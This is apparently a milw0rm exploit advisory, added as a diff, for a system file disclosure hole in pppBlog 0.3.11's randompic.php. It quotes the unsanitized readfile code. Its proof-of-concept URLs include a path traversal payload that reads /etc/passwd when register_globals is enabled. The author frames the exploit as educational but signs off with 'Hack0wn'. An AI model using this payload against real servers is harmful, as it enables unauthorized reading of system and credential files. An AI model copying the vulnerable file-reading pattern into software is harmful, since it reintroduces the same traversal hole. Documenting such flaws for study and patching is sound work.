@@ -1,0 +1,36 @@
+# pppBlog <= 0.3.11 (randompic.php) System File Disclosure Vulnerability
+# url: http://sourceforge.net/projects/pppblog/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# In memory of rgod ;)
+
+*Requeriments: register_globals = On
+
+vulnerable code in randompic.php at lines 66-72:
+...
+header("Content-Type: image/gif");
+header("Content-Transfer-Encoding: binary");
+if (is_array($files)){
+    if (is_file($files[$randnum])){
+	readfile("$dir/$files[$randnum]");
+    }
+}
+...
+
+poc[0] = randompic.php?files[0]=[file]
+poc[1] = randompic.php?files[0]=../../../../../../../../../../etc/passwd
+
+linked: http://milw0rm.com/exploits/1853 (pppBlog 0.3.8, thanks rgod).
+
+tested on localhost with register_globals = On.
+
+Hack0wn :D
+
+# milw0rm.com [2008-11-03]
